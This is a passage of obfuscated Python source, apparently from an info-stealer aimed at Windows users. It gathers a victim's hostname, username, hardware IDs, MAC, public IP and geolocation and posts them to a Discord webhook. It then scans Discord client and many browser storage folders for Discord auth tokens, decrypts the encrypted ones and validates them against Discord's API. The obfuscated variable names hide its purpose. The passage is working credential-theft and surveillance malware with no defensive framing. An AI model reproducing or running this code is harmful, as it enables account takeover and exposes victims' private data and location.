    except: CKBKIEFUOROQNVRVVXAHIANRHICSBVTANTDQMJRXNYHVHVXHVJYJRDPFALUHYTLVMWUCLZXEWLHLOWWONLDTEPGQJZQZHQRUH = "None"

    try:
        ZZBIDCMTMAYHKXTSUMGLCXHXZQPFPBSTNCJQESMWQOWQBQEYVYVBAYHYMSAYDQMWPID = []
        UZUJYOJYWYJRZAICBLJNOPYJIMHRRRBAZFSDEDCDAGQPREGMUKWISUUQUHGUXJMQDHNIPJD = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if UZUJYOJYWYJRZAICBLJNOPYJIMHRRRBAZFSDEDCDAGQPREGMUKWISUUQUHGUXJMQDHNIPJD & 1:
                NLUFVCCAABUNRFEHCBDJVRWRPZYJAPLVQISXMLGEWWKRNWBZWAHOB = v4r_letter + ":\\"
                try:
                    UYOSNDIPXVVYDNYCHOXEEODBYUZBPZUJBOZWRVAHHJSJQNGGXGXGZOUEPNHBUXYTFDBPDDPBXANSMMYLOJDQIVVIKGV = ctypes.c_ulonglong(0)
                    LDMQTTPKKMPRNHGFXSMTKXYDZEFCYUBNNAFBYRHWIRVDUVJFEOZDKUIYCRNCQOMDQKNAYWB = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(NLUFVCCAABUNRFEHCBDJVRWRPZYJAPLVQISXMLGEWWKRNWBZWAHOB), None, ctypes.pointer(LDMQTTPKKMPRNHGFXSMTKXYDZEFCYUBNNAFBYRHWIRVDUVJFEOZDKUIYCRNCQOMDQKNAYWB), ctypes.pointer(UYOSNDIPXVVYDNYCHOXEEODBYUZBPZUJBOZWRVAHHJSJQNGGXGXGZOUEPNHBUXYTFDBPDDPBXANSMMYLOJDQIVVIKGV))
                    VPKHPYRQLUWAMQDASZRAFZMVFPZUJRMSSYVSPRFYHOEINEJFKBMZDPEVCCZBXZV = LDMQTTPKKMPRNHGFXSMTKXYDZEFCYUBNNAFBYRHWIRVDUVJFEOZDKUIYCRNCQOMDQKNAYWB.value
                    SSEGKOKPEPREZPBKLXDKLCSEXHUVRENVVBCDKWKFCDMQJQHKUBCNFCRXB = UYOSNDIPXVVYDNYCHOXEEODBYUZBPZUJBOZWRVAHHJSJQNGGXGXGZOUEPNHBUXYTFDBPDDPBXANSMMYLOJDQIVVIKGV.value
                    WIQLFFUVXPKHJCVOYTASIMBLDNLOFEKNSDPDGYWGOAXMIHBZFJKHKYS = VPKHPYRQLUWAMQDASZRAFZMVFPZUJRMSSYVSPRFYHOEINEJFKBMZDPEVCCZBXZV - SSEGKOKPEPREZPBKLXDKLCSEXHUVRENVVBCDKWKFCDMQJQHKUBCNFCRXB
                    AQGGZLKNBNKSBCPLQCAOZOLUWUTPNSHMOFKOLTJUVPDHLBYQRWWDHGDGRJSQZWJATBDKOMZI = win32api.GetVolumeInformation(NLUFVCCAABUNRFEHCBDJVRWRPZYJAPLVQISXMLGEWWKRNWBZWAHOB)[0]
                    drive = {
                        'drive': NLUFVCCAABUNRFEHCBDJVRWRPZYJAPLVQISXMLGEWWKRNWBZWAHOB,
                        'total': VPKHPYRQLUWAMQDASZRAFZMVFPZUJRMSSYVSPRFYHOEINEJFKBMZDPEVCCZBXZV,
                        'free': SSEGKOKPEPREZPBKLXDKLCSEXHUVRENVVBCDKWKFCDMQJQHKUBCNFCRXB,
                        'used': WIQLFFUVXPKHJCVOYTASIMBLDNLOFEKNSDPDGYWGOAXMIHBZFJKHKYS,
                        'name': AQGGZLKNBNKSBCPLQCAOZOLUWUTPNSHMOFKOLTJUVPDHLBYQRWWDHGDGRJSQZWJATBDKOMZI,
                    }
                    ZZBIDCMTMAYHKXTSUMGLCXHXZQPFPBSTNCJQESMWQOWQBQEYVYVBAYHYMSAYDQMWPID.append(drive)
                except:
                    ()
            UZUJYOJYWYJRZAICBLJNOPYJIMHRRRBAZFSDEDCDAGQPREGMUKWISUUQUHGUXJMQDHNIPJD >>= 1

        NJZJTNYIYXTOPMXRSTYXNCSQYZCVQSRCXKACIMNITSWJMYACYYABTWFUIBPTEHTCTFSOASMTAETFGFCJW = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in ZZBIDCMTMAYHKXTSUMGLCXHXZQPFPBSTNCJQESMWQOWQBQEYVYVBAYHYMSAYDQMWPID:
            XQKYPFATVTVSIEVXJJVINRWKVHWISSAFADACYFJDKIRZGLDNWKISERVQDPQJBSSDSFMQQPWSLHLW = (v4r_drive['used'] / v4r_drive['total']) * 100
            SSEGKOKPEPREZPBKLXDKLCSEXHUVRENVVBCDKWKFCDMQJQHKUBCNFCRXB_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            VPKHPYRQLUWAMQDASZRAFZMVFPZUJRMSSYVSPRFYHOEINEJFKBMZDPEVCCZBXZV_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            XQKYPFATVTVSIEVXJJVINRWKVHWISSAFADACYFJDKIRZGLDNWKISERVQDPQJBSSDSFMQQPWSLHLW_str = "{:.2f}%".format(XQKYPFATVTVSIEVXJJVINRWKVHWISSAFADACYFJDKIRZGLDNWKISERVQDPQJBSSDSFMQQPWSLHLW)
            NJZJTNYIYXTOPMXRSTYXNCSQYZCVQSRCXKACIMNITSWJMYACYYABTWFUIBPTEHTCTFSOASMTAETFGFCJW += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   SSEGKOKPEPREZPBKLXDKLCSEXHUVRENVVBCDKWKFCDMQJQHKUBCNFCRXB_gb,
                                                                   VPKHPYRQLUWAMQDASZRAFZMVFPZUJRMSSYVSPRFYHOEINEJFKBMZDPEVCCZBXZV_gb,
                                                                   XQKYPFATVTVSIEVXJJVINRWKVHWISSAFADACYFJDKIRZGLDNWKISERVQDPQJBSSDSFMQQPWSLHLW_str,
                                                                   v4r_drive['name'])
    except:
        NJZJTNYIYXTOPMXRSTYXNCSQYZCVQSRCXKACIMNITSWJMYACYYABTWFUIBPTEHTCTFSOASMTAETFGFCJW = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            USJUUXTSCZAZBNWJEELFPIVYRNVNHYZCTVFGLINBPREMYXBECEPGOBJJQFYWTYIHGPHHAPH = 'Pc Portable'
        else:
            USJUUXTSCZAZBNWJEELFPIVYRNVNHYZCTVFGLINBPREMYXBECEPGOBJJQFYWTYIHGPHHAPH = 'Pc Fixed'
    except:
        USJUUXTSCZAZBNWJEELFPIVYRNVNHYZCTVFGLINBPREMYXBECEPGOBJJQFYWTYIHGPHHAPH = "None"

    try: QXPFGIGHLSNMEVPIPVWJWVTQPVKQDXUIGNJKWTHETGRUUJBINLJICNVAIHSFFKWFWWLWFPIXRXKCCJTQCVEAMTNZZ = len(screeninfo.get_monitors())
    except: QXPFGIGHLSNMEVPIPVWJWVTQPVKQDXUIGNJKWTHETGRUUJBINLJICNVAIHSFFKWFWWLWFPIXRXKCCJTQCVEAMTNZZ = "None"

    embed = Embed(title=f'System Info {DPZEOYYVYHHCDTHYXVDIUJXMLXNPECBKTNJUHKJWBHAOJYTUMWKLLEGYQAR}:', color=DAPSMXEDLIKSTFUVWGEPGFEBJXTTEWJJUJETQQTXGTJKZRGEXTXDCIJM)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {TLZVPRRZUEOPKLVOMRUIIPRTJDQJMYCPWCVIPXFBFNTEDBFXQIPLI}
Username    : {DFOUILSAESRKZYAJGXEBLBNMMTCPLNWFPYFKETXXQUAMMPWMCCGKVYTOJMRECVXPPNKBWMS}
DisplayName : {QWCRRCTSRZDTTQXMDRBUZYTGTPAXEEOPQAGPEQTUVDREBUFMDUWAJAQFEUPSOQDFMRIXGTVPZELLACRQWLY}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {USJUUXTSCZAZBNWJEELFPIVYRNVNHYZCTVFGLINBPREMYXBECEPGOBJJQFYWTYIHGPHHAPH}
Exploitation  : {NIINOHMLEDGBRWNKBCEJSVIEQBMAPVZEJJPDPTLHMVVPIZGZYLUHAAQFGRSLRJXBGFCFCEOCM} {WKMXTBWGFIVUHFVDHOZTEXXIKSVURBQHDOCFJEGGWVGMEKBYZMUSYTFJJBTK}
Screen Number : {QXPFGIGHLSNMEVPIPVWJWVTQPVKQDXUIGNJKWTHETGRUUJBINLJICNVAIHSFFKWFWWLWFPIXRXKCCJTQCVEAMTNZZ}

HWID : {VOCMSMPAMMDDQNSMYPEDUUXTYHNDCDUNDZORTWTQXEBIGBDRVLUFJDFYCZZLPXHHGOGTKBECGDIKURGCURLDDVHHYMJDKUZZLTQI}
MAC  : {GEPQLWKLGBUBLJXDOYEUDAYWCQEAUOGKHEZIWZYARQRNUHCFLRIP}
CPU  : {BEPMHEHNLMIAOAMFNIWQPCYIALPSDOFVWLHPIPSFZMGMQOHVGYNWOODZNUGRP}, {AHFSXOQXEJBEYHIBLRXMJZQARKBMFXPSPOSPYDRDYJCPELDSCAFEVSKFZZCKOWUYLUQMWBMHDS} Core
GPU  : {CKBKIEFUOROQNVRVVXAHIANRHICSBVTANTDQMJRXNYHVHVXHVJYJRDPFALUHYTLVMWUCLZXEWLHLOWWONLDTEPGQJZQZHQRUH}
RAM  : {ZVZNZVXAJJMNKKAMBUNVOHFHRSQSSOVVNOSZWTLIMPNMGKVWTAUKMWOLTXAURNHGNJPEDFIKSWBMLMURHEONS}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {CKAIWASOGZRWBZEYMZLMRMRJOEFWOFXGQJRPRJRLUGCFWMLRCYPFQXYAETTAMVWUXOOPWRJUDYGSGVYRSPPJXR}
Local  : {IFGADTZSWFXWFOWSCLOWXOQEEKMVUFQOUYLPPHCTQDBKZCVGGUKVXAVU}
Isp    : {BSDNOIZPTCXHKRUUGRBTSTZAWSUWZJPSDJWPJYDQLPNQAIPARCMEEAOABFTWBXIDRKNYAVEZTBPVVMSHX}
Org    : {TLPCDOWLWISDBFXEKFRZOWIDEGODJKUHYOOMXWIOPFJCHCSNIOINQNCQDFRPJVEWLKKOMKOOLFJWX}
As     : {ZCOZAUESXGSLQTBJGAHAVQBVSASYATBMOSLRLZAKUAKMPOTDKNQIRRNMGSGWNKWFWIIBIEIDUVA}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{NJZJTNYIYXTOPMXRSTYXNCSQYZCVQSRCXKACIMNITSWJMYACYYABTWFUIBPTEHTCTFSOASMTAETFGFCJW}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {CFSDMJPGDBDMLCCZWRNRJMXVLUJREHEDEQLLCVQSYSVTNJQTMMJWZYHSFOLDAMMKPBAQJ} ({CFSDMJPGDBDMLCCZWRNRJMXVLUJREHEDEQLLCVQSYSVTNJQTMMJWZYHSFOLDAMMKPBAQJ_code})
Region    : {ASCGFXFPCVIYOLQFJGOFWXGQAYEBVGZTHPVEUOUBXTYYQPXKBUDYNT} ({ASCGFXFPCVIYOLQFJGOFWXGQAYEBVGZTHPVEUOUBXTYYQPXKBUDYNT_code})
Zip       : {PZADNNGNYKKHEVOKKZNRPRFFHYGOKPEMUOXLIHDFCIIQXMVCTAR}
City      : {YFYSKXZUNNMCTJMBTFIAYXZEZNVWNJGLXGEYXBXVAKGZSXWMYEZMVHSGJENYBDAJFNGNEAHGIDPOJTNNONVWKDEETXMJHKDP}
Timezone  : {IAYIQEXNLGNDGGDSFANAVYBLKITIBDJZOVQCJXSNUGONVASDFCES}
Latitude  : {NGMFHJRJZVRZELTHTVIQMVDVWUAUHECJEGJYJXLGICATFPJJAMZPCIJEWBNVYIHILCOESPABJUWF}
Longitude : {HKBWGPXQSTVLJVFBLTMEJPSWEHKSHZXSBQRZTCEYKOJVPLZZQULVOOQHNESRIGWZNAVLXQBVOUFWKEJLZXTLTONPJAECYFVV}```""", inline=False)


    embed.set_footer(text=AZAPUOATZPGDQDFGBUKJXQYURDKDMCRZDJOUCYSXGSRXNFWKMWVYXPZTRQAOKNWMAFWDEXJLMAE, icon_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)

    DCTAAWCEASRTNRSYWWWBECILFHBRCQLTDKLEKLQHHFCTZZWFNHLKNURXNBRVADULGVVUEHEXIBPEPZQUWISTZYEROZVR = SyncWebhook.from_url(CSRNJXPULINWNDPMPIZDEVUTAZWWOBQJXEPBRHDBFAGETEBWPMODBBI)
    DCTAAWCEASRTNRSYWWWBECILFHBRCQLTDKLEKLQHHFCTZZWFNHLKNURXNBRVADULGVVUEHEXIBPEPZQUWISTZYEROZVR.send(embed=embed, username=XBPXCQXYOTIABXOITFRXKODCIOGSZIEVUVDQUWPOHYAYXPAECZVFAWADBBUDMXVUTFDCIOTWMAQJDHEEVQPZAPXSWAVCG, avatar_url=SHOWNSKRNOCVGGNZLEOCBAMYPBDOARPSHJMIEAVZRIRZDFATBQOFUDSMFS)

def MWNVYDWEWVGZUEMUEAMFBDZWJTYIOFBABCHNAPIUZAQXVIUDZGTAZJCCGJXNDALBATHONZAINIUBUKBSIUF():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def GBASEMMXEMLCDURJRAUVUXRNYAEEUZSAUFEOXDQNJRUBQQVHENMUKYQXFAFCUVXUHZCQJJZAYSIEZWT():
        UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR = "https://discord.com/api/v9/users/@me"
        BQCCBPJFKPPQWIWXSBSEMJCULVICJTYLOTWQHXZTEIEBWQVVLLPNKPAILEECRIVPEQKMAQKSQO = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        BQCCBPJFKPPQWIWXSBSEMJCULVICJTYLOTWQHXZTEIEBWQVVLLPNKPAILEECRIVPEQKMAQKSQO_enc = r"dQw4w9WgXcQ:[^\"]*"
        QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX = []
        SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC = []
        SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW = {}

        FDKPVLKMCEYZYRJMOMIQLBWCARQCZYLINMSWRATHJDPGPSWEVFWZRRCTXHKTMTQSWPWNF = {
            'Discord': NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': AMADDHCQFOLNGYGRBCGTOOCGFLEEPRQUBLEAZMESRIIXTPUYKVEZTUXSHIYKNCWUVLDBUKSZXLLGUXOZKORQMFQCTIDX + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL, CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ in FDKPVLKMCEYZYRJMOMIQLBWCARQCZYLINMSWRATHJDPGPSWEVFWZRRCTXHKTMTQSWPWNF.items():
            if not os.path.exists(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
                continue
            MESCIIUJQPGYBFCIOXEONRQTDIYVYTREOQXVPHVCWSGTLXNSTMIIRBNXBPVLNMDWXTOXEXUQRCQSXKFX = MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL.replace(" ", "").lower()
            if "cord" in CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ:
                if not os.path.exists(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + f'\\{MESCIIUJQPGYBFCIOXEONRQTDIYVYTREOQXVPHVCWSGTLXNSTMIIRBNXBPVLNMDWXTOXEXUQRCQSXKFX}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(BQCCBPJFKPPQWIWXSBSEMJCULVICJTYLOTWQHXZTEIEBWQVVLLPNKPAILEECRIVPEQKMAQKSQO_enc, v4r_line.strip()):
                                DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ = JDSWGOMYNPPXYIYLDGQJOADGSDXECKXGSTXSOIZLFOKZKQNMIGSNUMZCUCNQBYNFVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), EELMGCJPTRRITYQVTSVMBFSDIMWAQVGZFYMMXIAAEMMVORPMTSUQITYANZYCZREQVBQQWLZDCPKCLYAQKFZMGBFLDHEDEI(NOQILWAWNRUJYCKTSLVBNVINBRPAQJNKHSIYXJXSFBXZOTWWFJUXDOMHMVHD + f'\\{MESCIIUJQPGYBFCIOXEONRQTDIYVYTREOQXVPHVCWSGTLXNSTMIIRBNXBPVLNMDWXTOXEXUQRCQSXKFX}\\Local State'))
                                if FRJYZYVKVFQFGFJKMAVZVQKVZDKKHOGWRGIVRJPUHFXMCTTFOPOBSKQICJVJMKWQOHMHJNBJTRWZAONEUMIPGPWRZZHQVOARBEUW(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ, UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR):
                                    IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB = requests.get(UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR, headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ}).json()['id']
                                    if IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB not in SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC:
                                        QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX.append(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ)
                                        SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC.append(IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB)
                                        SJDHWRXSFAQUCCZXERVKSUQDSZAUCHPFFHFHCSDZQKHTSGKEZHDUBODABDMXBWLGPDJXLDMCEOVXOMYAHOW[DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ] = (MFYLCYMPFKXUJRKNLDEDBWJDTPOGHUEDFOLJVTEGRHIODPUUNEJSYZZZLZUYJMVHL, f"{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{CBKHJNFUJFJHVDTTHNIVYEGQQEOXVKHMJTZLJACTRZOYGDHZDDOAUQDXNWMTZKHXXYMYYWFQZUUDHMRAFSZ}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ in re.findall(BQCCBPJFKPPQWIWXSBSEMJCULVICJTYLOTWQHXZTEIEBWQVVLLPNKPAILEECRIVPEQKMAQKSQO, v4r_line.strip()):
                                if FRJYZYVKVFQFGFJKMAVZVQKVZDKKHOGWRGIVRJPUHFXMCTTFOPOBSKQICJVJMKWQOHMHJNBJTRWZAONEUMIPGPWRZZHQVOARBEUW(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ, UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR):
                                    IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB = requests.get(UVQURMKHOXLARAJLAWPFLYQLDYFCUDBEHAKCMWFYDUFSYJKAMOMGYVBNFSTROZHFBAGWZLWHDWR, headers={'Authorization': DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ}).json()['id']
                                    if IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB not in SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC:
                                        QXCBBAQXLXAVJFOWKGFSHPUXIDWMWLSCRRTIHAAEWDUVHREPLRRZMTQYHDX.append(DJMWLHYDOOKMFVBAWMMGLHCJYDRNYWWXEATPPHZZONNPNLYPNKVUYEYYDGYKSIVSVEMZSWOUCQ)
                                        SYIOCLBJPIXVYVFSDRRQYKXVVPYFAFNQEXGEECFNJURFLOPJTDYIAPONYVERXYXDWVDOIFOC.append(IFQUDANKLKYLRQOIJYGJOUYGNICBOOZLMFTNUYIORCWHUBBAFMUOLPILVSHLUODUHGB)
